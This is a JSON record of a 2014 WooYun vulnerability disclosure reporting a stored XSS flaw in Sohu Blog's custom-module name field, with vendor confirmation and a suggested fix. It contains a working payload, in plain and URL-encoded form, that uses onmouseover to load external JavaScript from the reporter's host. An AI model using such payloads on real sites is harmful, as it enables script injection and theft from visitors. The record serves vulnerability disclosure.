{"id": 58692, "wybug_id": "wooyun-2014-050193", "wybug_title": "搜狐博客存储型XSS漏洞", "wybug_corp": "搜狐", "wybug_author": "q601333824", "wybug_date": "2014-02-02 10:54", "wybug_open_date": "2014-03-19 10:55", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "4", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-19：\t细节向公众公开  简要描述： 搜狐博客XSS 详细说明：        1.存在XSS的功能位置，添加模块---自定义列表---名称一栏，如图  \n\n \n\n      2.名称那一栏会提示标题字数太多了，所以上次想提交，又觉得鸡肋，但是后来发现了，这里的标题字数，只是本地检查，服务器端根本没有进行检查，只要用一些post软件直接post就绕过标题字数限制了........     3.由于名称处，没有对双引号，进行过滤，再加上能绕过字数检查，知道这个就能构造XSS，用onmouseover触发XSS，把style属性设置一下显示全屏，这样打开博客鼠标移动到哪都能触发XSS      4.先构造好代码加载外部JS：       (1)\"onmouseover=\"var s=document.createElement(\"script\");s.src=\"http://q601333824.duapp.com/\";document.body.appendChild(s);\"style=\"left: 0px; top: -8px; width: 100%; height: 100%; position: fixed; cursor: default !important;\"       (2)由于要post,还要进行编码：%5C%22onmouseover%3D%5C%22var%20s%3ddocument.createElement(%26%2339%3bscript%26%2339%3b)%3bs.src%3d%26%2339%3bhttp%3a%2f%2fq601333824.duapp.com%2f%26%2339%3b%3bdocument.body.appendChild(s)%3b%5C%22style%3D%5C%22left%3a%200px%3b%20top%3a%20-8px%3b%20width%3a%20100%25%3b%20height%3a%20100%25%3b%20position%3a%20fixed%3b%20%5C%22    (不编码post试过了，要么自定义模块内容直接被清空了，要么标签错乱=_=)       5.然后post修改名称,如图 \n\n       6.打开博客的时候鼠标只要移动，就能触发XSS了，，给出了代码存在的位置 \n\n       (没想到名称能打那么长=_=)   漏洞证明：     1. \n\n \n\n   2.用post的软件发送代码:%5C%22onmouseover%3D%5C%22var%20s%3ddocument.createElement(%26%2339%3bscript%26%2339%3b)%3bs.src%3d%26%2339%3bhttp%3a%2f%2fq601333824.duapp.com%2f%26%2339%3b%3bdocument.body.appendChild(s)%3b%5C%22style%3D%5C%22left%3a%200px%3b%20top%3a%20-8px%3b%20width%3a%20100%25%3b%20height%3a%20100%25%3b%20position%3a%20fixed%3b%20%5C%22   3. \n\n   4. \n\n   修复方案：  过滤双引号就行了   版权声明：转载请注明来源 q601333824@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-02-03 12:27 厂商回复： 感谢支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}